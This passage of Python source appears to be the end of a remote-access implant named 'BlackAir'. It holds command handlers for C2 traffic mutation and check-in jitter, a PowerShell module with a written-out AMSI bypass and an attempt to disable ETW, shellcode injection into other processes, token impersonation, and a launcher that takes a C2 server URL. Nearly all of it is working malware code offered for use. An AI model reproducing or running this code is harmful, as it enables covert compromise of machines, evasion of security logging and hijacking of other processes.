    def _cmd_mutate(self, args: str) -> str:
        """Control traffic mutation
        
        Format: status|config param=value
        Examples: mutate status
                 mutate config enabled=true
                 mutate config techniques=packet_fragmentation,header_manipulation
        """
        parts = args.split(maxsplit=1)
        if not parts:
            return "Error: Missing parameters"
            
        action = parts[0].lower()
        
        if action == "status":
            mutation_config = self.air_config["evasion"]["traffic_mutation"]
            mutator = self.evasion_engine.traffic_mutator
            
            result = "Traffic Mutation Status:\n"
            result += f"Enabled: {mutation_config['enabled']}\n"
            result += f"Techniques: {', '.join(mutation_config['techniques'])}\n"
            
            # Add mutation history
            if mutator.mutation_history:
                result += "\nRecent mutations:\n"
                for i, entry in enumerate(mutator.mutation_history[-5:]):
                    result += f"{i+1}. {entry['timestamp']}: {', '.join(entry['mutations'])}\n"
                    result += f"   Protocol: {entry['protocol']}, Size change: {entry['data_size']} -> {entry['result_size']}\n"
            
            return result
            
        elif action == "config":
            if len(parts) < 2:
                return "Error: Missing configuration parameters"
                
            config_str = parts[1]
            
            # Parse parameters
            updates = {}
            for param in config_str.split():
                if "=" in param:
                    key, value = param.split("=", 1)
                    
                    if key == "enabled":
                        updates[key] = value.lower() in ["true", "yes", "1"]
                    elif key == "techniques":
                        techniques = value.split(",")
                        valid_techniques = ["packet_fragmentation", "header_manipulation", "protocol_tunneling", "timing_manipulation"]
                        valid = all(t in valid_techniques for t in techniques)
                        
                        if valid:
                            updates[key] = techniques
                        else:
                            return f"Error: Invalid techniques. Valid values: {', '.join(valid_techniques)}"
            
            # Apply updates
            for key, value in updates.items():
                self.air_config["evasion"]["traffic_mutation"][key] = value
            
            # Reload configuration
            self.evasion_engine.traffic_mutator = TrafficMutator(self.air_config["evasion"]["traffic_mutation"])
            
            return f"Traffic mutation configuration updated: {updates}"
            
        else:
            return f"Error: Unknown action: {action}"
    
    def _cmd_jitter(self, args: str) -> str:
        """Configure communication jitter
        
        Format: status|set sleep_time jitter
        Examples: jitter status
                 jitter set 60 20
        """
        parts = args.split()
        if not parts:
            return "Error: Missing parameters"
            
        action = parts[0].lower()
        
        if action == "status":
            result = "Jitter Configuration:\n"
            result += f"Sleep time: {self.config.get('sleep_time', 60)} seconds\n"
            result += f"Jitter: {self.config.get('jitter', 20)}%\n"
            
            # Add next check delay based on behavior profile
            next_delay = self.evasion_engine.get_next_checkin_delay(self.config.get("sleep_time", 60))
            result += f"\nNext check-in delay (with evasion): {next_delay} seconds\n"
            
            return result
            
        elif action == "set":
            if len(parts) < 3:
                return "Error: Missing sleep_time or jitter"
                
            try:
                sleep_time, jitter = int(parts[1]), int(parts[2])
                
                if sleep_time < 1 or jitter < 0 or jitter > 100:
                    return f"Error: Invalid parameters. Sleep time must be ≥1, jitter must be 0-100"
                    
                self.config.update({"sleep_time": sleep_time, "jitter": jitter})
                return f"Jitter configuration updated: sleep_time={sleep_time}s, jitter={jitter}%"
                
            except ValueError:
                return "Error: Invalid sleep_time or jitter values"
                
        else:
            return f"Error: Unknown action: {action}"

    def _cmd_powershell(self, args: str) -> str:
        """Execute PowerShell commands with enhanced evasion
        
        Format: load|run|inject|tokens|amsi|etw [params]
        Examples: powershell load BlackAirPS.ps1
                 powershell run Get-Process
                 powershell inject 1234 encoded_shellcode
                 powershell tokens 1234
                 powershell amsi disable
                 powershell etw disable
        """
        if not args:
            return "Error: PowerShell command requires arguments"
        
        parts = args.split(maxsplit=1)
        action = parts[0].lower()
        params = parts[1] if len(parts) > 1 else ""
        
        try:
            # PowerShell integration commands
            if action == "load":
                return self._ps_load_script(params)
            elif action == "run":
                return self._ps_execute(params)
            elif action == "inject":
                return self._ps_inject(params)
            elif action == "tokens":
                return self._ps_impersonate_token(params)
            elif action == "amsi":
                return self._ps_disable_amsi(params)
            elif action == "etw":
                return self._ps_disable_etw(params)
            elif action == "status":
                return self._ps_get_status()
            else:
                return f"Error: Unknown PowerShell action: {action}"
        except Exception as e:
            logging.error(f"PowerShell command error: {e}")
            return f"Error executing PowerShell command: {e}"
    
    def _ps_load_script(self, path: str) -> str:
        """Load a PowerShell script into memory
        
        Args:
            path: Path to the PowerShell script
            
        Returns:
            Command result
        """
        if not path:
            return "Error: Script path required"
        
        try:
            # Check if the script exists
            if not os.path.exists(path):
                # Try to find it in the same directory as the implant
                implant_dir = os.path.dirname(os.path.abspath(__file__))
                alt_path = os.path.join(implant_dir, path)
                if not os.path.exists(alt_path):
                    return f"Error: Script not found at {path} or {alt_path}"
                path = alt_path
                
            # Read the script content
            with open(path, 'r') as f:
                script_content = f.read()
                
            # Store script in memory for later use
            script_name = os.path.basename(path)
            if not hasattr(self, 'ps_scripts'):
                self.ps_scripts = {}
            self.ps_scripts[script_name] = script_content
            
            # Record loaded modules
            if not hasattr(self, 'ps_modules'):
                self.ps_modules = []
            self.ps_modules.append(script_name)
            
            return f"PowerShell script {script_name} loaded successfully"
        except Exception as e:
            return f"Error loading script: {e}"
    
    def _ps_execute(self, command: str) -> str:
        """Execute a PowerShell command
        
        Args:
            command: PowerShell command to execute
            
        Returns:
            Command output
        """
        if not command:
            return "Error: Command required"
        
        try:
            # Create PowerShell process
            startupinfo = subprocess.STARTUPINFO()
            startupinfo.dwFlags |= subprocess.STARTF_USESHOWWINDOW
            
            # Check if we need to apply evasion to PowerShell
            evasion_level = self.evasion_engine.evasion_level
            if evasion_level >= 7:
                # High evasion - Add AMSI/ETW bypass
                full_command = 'powershell.exe -NoProfile -NonInteractive -ExecutionPolicy Bypass -Command "'
                full_command += '[Ref].Assembly.GetType(\'System.Management.Automation.AmsiUtils\').GetField(\'amsiInitFailed\',\'NonPublic,Static\').SetValue($null,$true); '
                full_command += '$EtwEventWriteAddr = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer('
                full_command += '[System.Runtime.InteropServices.Marshal]::GetProcAddress('
                full_command += '[System.Runtime.InteropServices.Marshal]::LoadLibrary(\\"ntdll.dll\\"), \\"EtwEventWrite\\"), [System.Action]).Invoke(); '
                full_command += command + '"'
            else:
                # Standard execution
                full_command = f'powershell.exe -NoProfile -NonInteractive -ExecutionPolicy Bypass -Command "{command}"'
            
            # Execute the command
            process = subprocess.Popen(
                full_command,
                stdout=subprocess.PIPE,
                stderr=subprocess.PIPE,
                startupinfo=startupinfo,
                shell=True,
                text=True
            )
            
            # Get output with timeout based on evasion level
            timeout = 30 if evasion_level < 5 else 60
            stdout, stderr = process.communicate(timeout=timeout)
            
            # Process the results
            if process.returncode != 0:
                return f"PowerShell Error (code {process.returncode}):\n{stderr}"
            
            return f"PowerShell Output:\n{stdout}"
        except subprocess.TimeoutExpired:
            process.kill()
            return "Error: PowerShell command timed out"
        except Exception as e:
            return f"Error executing PowerShell: {e}"
    
    def _ps_inject(self, params: str) -> str:
        """Perform process injection via PowerShell
        
        Args:
            params: Format "PID EncodedShellcode"
            
        Returns:
            Result of the injection
        """
        parts = params.split(maxsplit=1)
        if len(parts) < 2:
            return "Error: Missing PID or shellcode"
            
        try:
            # Parse PID and shellcode
            pid = int(parts[0])
            encoded_shellcode = parts[1]
            
            # Create injection command
            inject_cmd = f"Invoke-ProcessInjection -TargetPID {pid} -Shellcode ([Convert]::FromBase64String('{encoded_shellcode}'))"
            
            # Verify we have the required module loaded
            if not hasattr(self, 'ps_modules') or "BlackAirPS.ps1" not in self.ps_modules:
                # Load builtin injection module
                blackair_ps_path = os.path.join(os.path.dirname(os.path.abspath(__file__)), "BlackAirPS.ps1")
                if os.path.exists(blackair_ps_path):
                    self._ps_load_script(blackair_ps_path)
                else:
                    return "Error: BlackAirPS.ps1 module not found and required for process injection"
            
            # Execute injection command
            return self._ps_execute(inject_cmd)
        except ValueError:
            return "Error: Invalid PID"
        except Exception as e:
            return f"Injection error: {e}"
    
    def _ps_impersonate_token(self, params: str) -> str:
        """Impersonate a token from another process
        
        Args:
            params: PID to impersonate
            
        Returns:
            Result of the impersonation
        """
        if not params:
            return "Error: Missing PID"
            
        try:
            # Parse PID
            pid = int(params)
            
            # Create impersonation command
            impersonate_cmd = f"Invoke-TokenImpersonation -TargetPID {pid}"
            
            # Execute impersonation command
            return self._ps_execute(impersonate_cmd)
        except ValueError:
            return "Error: Invalid PID"
        except Exception as e:
            return f"Impersonation error: {e}"
    
    def _ps_disable_amsi(self, params: str) -> str:
        """Disable AMSI via PowerShell
        
        Args:
            params: 'disable' to disable AMSI, 'status' to check status
            
        Returns:
            Result of the operation
        """
        if params.lower() == "disable":
            return self._ps_execute("Disable-AMSI")
        elif params.lower() == "status":
            return self._ps_execute("if ([Ref].Assembly.GetType('System.Management.Automation.AmsiUtils').GetField('amsiInitFailed','NonPublic,Static').GetValue($null)) { 'AMSI is disabled' } else { 'AMSI is enabled' }")
        else:
            return "Error: Unknown AMSI action. Use 'disable' or 'status'"
    
    def _ps_disable_etw(self, params: str) -> str:
        """Disable ETW logging via PowerShell
        
        Args:
            params: 'disable' to disable ETW, 'status' to check status
            
        Returns:
            Result of the operation
        """
        if params.lower() == "disable":
            return self._ps_execute("Disable-ETW")
        elif params.lower() == "status":
            # A basic check for ETW patch is difficult, this is a placeholder
            return self._ps_execute("'ETW status check requires manual verification'")
        else:
            return "Error: Unknown ETW action. Use 'disable' or 'status'"
    
    def _ps_get_status(self) -> str:
        """Get PowerShell integration status
        
        Returns:
            Status information
        """
        status = "PowerShell Integration Status:\n"
        
        # Check if we have loaded any scripts
        if hasattr(self, 'ps_modules') and self.ps_modules:
            status += f"Loaded modules: {', '.join(self.ps_modules)}\n"
        else:
            status += "No PowerShell modules loaded\n"
        
        # Check PowerShell execution policy
        exec_policy = self._ps_execute("Get-ExecutionPolicy")
        status += f"Current execution policy: {exec_policy}\n"
        
        # Check PowerShell version
        ps_version = self._ps_execute("$PSVersionTable.PSVersion.ToString()")
        status += f"PowerShell version: {ps_version}\n"
        
        return status


def main():
    """Main entry point when run directly"""
    try:
        parser = argparse.ArgumentParser(description="BlackAir Implant")
        parser.add_argument("--c2", help="C2 server URL")
        parser.add_argument("--profile", choices=["office_worker", "developer", "server", "generic"], 
                          default="office_worker", help="Behavior profile type")
        parser.add_argument("--level", type=int, choices=range(1, 11), default=7, 
                          help="Evasion level (1-10)")
        parser.add_argument("--mesh", action="store_true", help="Enable mesh C2 functionality")
        parser.add_argument("--port", type=int, default=0, 
                          help="Port for mesh C2 server (0=random)")
        parser.add_argument("--powershell", action="store_true",
                          help="Enable PowerShell integration")
        
        args = parser.parse_args()
        
        # Create configuration
        config = {
            "air_config": {
                "evasion": {
                    "behavior_profile": args.profile,
                    "evasion_level": args.level
                },
                "mesh_c2": {
                    "enabled": args.mesh,
                    "bind_port": args.port
                }
            }
        }
        
        if args.c2:
            config["c2_endpoints"] = [args.c2]
        
        # Initialize implant
        implant = BlackAirImplant(config)
        
        # Start implant
        implant.start()
        
        # Keep running until interrupted
        while implant.running:
            time.sleep(1)
            
    except KeyboardInterrupt:
        pass
    finally:
        # Ensure proper shutdown
        if 'implant' in locals():
            implant.stop()


if __name__ == "__main__":
    main()